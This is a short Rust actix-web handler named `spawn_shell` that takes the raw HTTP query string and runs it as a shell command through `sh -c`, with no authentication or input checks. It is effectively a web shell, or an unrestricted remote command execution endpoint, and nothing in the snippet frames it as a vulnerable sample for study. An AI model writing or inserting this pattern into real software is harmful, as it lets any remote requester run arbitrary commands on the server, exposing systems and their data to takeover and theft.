use actix_web::{web, HttpRequest, HttpResponse};
use std::process::Command;

async fn spawn_shell(req: HttpRequest) -> HttpResponse {
    let script = req.query_string();
    let child = Command::new("sh")
        .args(&["-c", script])
        .spawn()
        .expect("Failed to spawn");
    HttpResponse::Ok().body("Command spawned")
}
